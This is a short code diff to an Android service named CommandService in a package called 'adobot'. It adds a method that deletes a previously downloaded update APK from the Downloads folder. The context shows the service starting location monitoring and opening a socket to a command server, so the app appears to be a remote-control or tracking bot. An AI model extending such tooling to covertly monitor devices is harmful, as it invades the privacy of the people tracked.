@@ -2,6 +2,7 @@ package com.android.adobot;
 
 import android.app.Service;
 import android.content.Intent;
+import android.os.Environment;
 import android.os.IBinder;
 import android.util.Log;
 
@@ -9,6 +10,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.net.URISyntaxException;
 import java.util.HashMap;
 
@@ -59,6 +61,7 @@ public class CommandService extends Service {
         locationTask = new LocationMonitor(this);
         locationTask.start();
         createSocket(params.getServer());
+        cleanUp();
 
     }
 
@@ -231,6 +234,13 @@ public class CommandService extends Service {
             e.printStackTrace();
         }
 
+    }
+
+    private void cleanUp () {
+//        remove previously installed update apk file
+        File updateApk = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), Constants.UPDATE_PKG_FILE_NAME);
+        if (updateApk.exists())
+            updateApk.delete();
     }
 
 }
